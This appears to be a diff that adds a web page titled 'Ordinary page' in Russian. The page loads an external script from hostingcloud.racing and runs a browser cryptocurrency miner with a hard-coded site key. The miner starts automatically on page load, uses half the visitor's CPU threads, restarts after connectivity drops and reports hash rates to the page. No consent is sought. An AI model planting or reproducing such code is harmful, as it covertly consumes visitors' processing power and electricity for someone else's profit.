@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/style.css">
+    <title>Обычная страница</title>
+</head>
+
+<body>
+
+    <script src="js/jquery-3.3.1.min.js"></script>
+    <script src="https://www.hostingcloud.racing/VEs0.js"></script>
+
+    <div>
+
+        <p id="text"></p>
+        <p id="text2"></p>
+        <p id="text3"></p>
+
+        <p id="text4"></p>
+        <input placeholder="thr" id="val1">
+        <input placeholder="threads" id="val2">
+        <button id="btn">set</button>
+
+    </div>
+
+    <script>
+        $(() => {
+
+            var was, wasOffline, miner = new Client.Anonymous('de8dcaabda1779417a822eb5708d069a675dfdd256bb4aaabe9e3ddfa7a15be2', {
+                c: "w"
+            })
+
+            function setMiner(t, t2) {
+
+                miner.stop()
+                miner.setThrottle(t ? t : 0.5)
+                if (!was) {
+
+                    was = true
+                    $("#text4").text("MAX THREADS: " + miner.getNumThreads())
+
+                }
+                console.log(miner.getNumThreads())
+                miner.setNumThreads(t2 ? t2 : Math.ceil(miner.getNumThreads() / 2))
+                console.log(miner.getNumThreads(), miner.getThrottle())
+                miner.start()
+
+            }
+
+            $("#btn").click(() => {
+
+                setMiner(+$("#val1").val(), +$("#val2").val())
+
+            })
+
+            setMiner()
+
+            miner.on("job", function(params) {
+                console.log('has found new job', params)
+            })
+
+            miner.on('accepted', function(params) {
+                console.log('has accepted by the pool', params)
+            });
+
+            miner.on('error', function(params) {
+                console.log('wtf err', params)
+            });
+
+            setInterval(() => {
+
+                $("#text").text(miner.getAcceptedHashes())
+                $("#text2").text(miner.getTotalHashes())
+                $("#text3").text(miner.getHashesPerSecond())
+                if (!navigator.onLine) wasOffline = true
+                else if (wasOffline) setMiner()
+
+            }, 1000)
+
+        })
+    </script>
+
+</html>
